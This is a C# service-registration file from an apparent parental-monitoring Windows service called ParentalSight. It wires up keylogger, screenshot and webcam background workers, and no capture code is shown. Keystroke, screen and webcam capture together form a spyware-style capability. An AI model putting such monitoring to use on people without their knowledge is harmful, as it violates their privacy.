﻿namespace ParentalSight.WindowsService
{
    using Microsoft.Extensions.Configuration;
    using Microsoft.Extensions.DependencyInjection;
    using ParentalSight.Core;
    using ParentalSight.WindowsService.Settings;
    using ParentalSight.WindowsService.WorkerServices;
    using System;
    using System.Collections.Generic;

    internal static class WorkerRegistrar
    {
        private static Dictionary<string, Action<IServiceCollection, IConfiguration>> _hostedServiceRegistrations =>
            new Dictionary<string, Action<IServiceCollection, IConfiguration>>
            {
                {
                     "keylogger", (services, config) => services.AddHostedService<KeyloggerWorker>()
                                                                .AddKeylogger(new KeyloggerSettings(config))
                },
                {
                    "screenshot", (services, config) => services.AddHostedService<ScreenshotWorker>()
                                                                .AddScreenshotService(new ScreenshotSettings(config))
                },
                {
                        "webcam", (services, config) => services.AddHostedService<WebcamWorker>()
                                                                .AddWebcamService(new WebcamSettings(config))
                }
            };

        public static IServiceCollection AddHostedService(this IServiceCollection services, IConfiguration config, string worker)
        {
            if (string.IsNullOrEmpty(worker))
                throw new ArgumentNullException(nameof(worker));
            if (!_hostedServiceRegistrations.ContainsKey(worker))
                throw new NotImplementedException(worker);

            _hostedServiceRegistrations[worker](services, config);

            return services;
        }

        public static IServiceCollection AddHostedServices(this IServiceCollection services, IConfiguration config)
        {
            foreach (var registration in _hostedServiceRegistrations)
            {
                registration.Value(services, config);
            }

            return services;
        }
    }
}